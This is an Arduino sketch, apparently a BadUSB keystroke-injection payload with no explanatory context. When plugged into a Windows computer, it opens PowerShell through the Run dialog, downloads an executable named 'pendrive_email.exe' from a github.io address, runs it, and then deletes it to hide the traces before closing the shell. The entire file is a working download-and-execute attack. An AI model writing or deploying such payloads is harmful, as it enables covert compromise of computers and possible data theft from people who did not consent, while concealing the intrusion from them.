#include <Keyboard.h>

void setup() {
  // put your setup code here, to run once:
Keyboard.begin();
delay(2000);

Keyboard.press(KEY_LEFT_GUI);
Keyboard.press('r');
Keyboard.releaseAll();
delay(1000);

Keyboard.print("powershell");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(1000);

Keyboard.print("Start-BitsTransfer -Source https://hassagi.github.io/BadUSB/pendrive_email.exe");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(17000);

Keyboard.print(".\\pendrive_email.exe");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(20000);

Keyboard.print("Remove-Item -LiteralPath \".\\pendrive_email.exe\"");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(1000);

Keyboard.print("exit");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();

}

void loop() {
  // put your main code here, to run repeatedly:

}
